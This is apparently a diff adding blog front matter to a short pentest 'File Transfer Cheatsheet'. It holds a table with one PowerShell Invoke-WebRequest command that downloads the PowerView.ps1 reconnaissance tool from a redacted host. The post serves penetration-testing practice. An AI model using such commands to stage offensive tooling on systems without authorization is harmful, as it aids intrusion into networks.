@@ -1,3 +1,16 @@
+---
+layout:     post
+title:      "File Transfer Cheatseet"
+subtitle:   "File Transfer Cheatseet"
+date:       2024-03-26
+author:     "k1r4"
+header-img: "img/footprinting.webp"
+catalog:    true
+tags:
+    - web pentest
+    - payloads
+---
+
 | **Command** | **Description** |
 | --------------|-------------------|
 | `Invoke-WebRequest https://<snip>/PowerView.ps1 -OutFile PowerView.ps1` | Download a file with PowerShell |
